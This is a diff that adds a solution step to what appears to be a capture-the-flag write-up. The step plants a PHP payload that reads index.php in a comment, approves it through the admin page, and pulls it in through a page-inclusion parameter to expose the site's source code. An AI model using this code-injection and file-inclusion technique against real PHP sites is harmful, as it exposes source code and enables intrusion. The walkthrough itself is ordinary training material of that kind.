@@ -22,3 +22,12 @@ admin.auth.inc is used to login, however, there is also a admin.inc page, to app
 On the bottom is the flag.</br>
 
 ## Solution 3rd flag
+Create a comment with the following payload:
+```
+<?php readfile('index.php'); ?>
+```
+
+Approve it being the admin at the address `?page=admin.inc`
+
+Go to ?page=http://127.0.0.1/index and open the source code.</br>
+This will show the PHP source code of index.php.
